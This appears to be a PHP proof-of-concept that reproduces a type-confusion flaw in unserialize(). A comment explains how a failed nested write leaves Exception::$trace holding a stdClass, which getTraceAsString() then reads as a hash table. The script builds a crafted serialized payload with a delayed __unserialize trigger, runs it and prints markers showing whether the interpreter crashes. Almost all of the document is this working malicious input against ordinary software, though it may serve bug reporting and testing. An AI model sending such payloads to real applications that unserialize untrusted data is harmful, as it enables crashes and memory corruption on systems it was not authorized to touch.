<?php
/* process_nested_object_data() writes into the typed slot, then returns
 * failure without restoring the declared default. Exception::$trace (array)
 * is left holding the partial stdClass. Delayed __unserialize then calls
 * getTraceAsString(), which trusts the property type and walks the object
 * header as a HashTable.
 */
echo "PHP ".PHP_VERSION."\n";
class Trig {
    public function __unserialize(array $data): void {
        $e = $data[0];
        echo "HIT ".get_class($e)."\n";
        $rp = new ReflectionProperty(Exception::class, 'trace');
        $t = $rp->getValue($e);
        echo "TRACE_TYPE=".gettype($t)."\n";
        if (is_object($t)) {
            echo "TRACE_CLASS=".get_class($t)."\n";
        }
        echo "CALL_getTraceAsString\n";
        echo $e->getTraceAsString();
        echo "NO_CRASH\n";
    }
}
$n = "\x00";
$payload =
    'O:9:"Exception":1:{s:16:"'.$n.'Exception'.$n.'trace";'.
    'O:8:"stdClass":2:{s:1:"x";O:4:"Trig":1:{i:0;R:1;}z}}';
echo "BEFORE\n";
try {
    $r = unserialize($payload);
    echo "RETURNED ".gettype($r)."\n";
} catch (Throwable $e) {
    echo "CAUGHT ".$e::class.": ".$e->getMessage()."\n";
}
echo "AFTER\n";
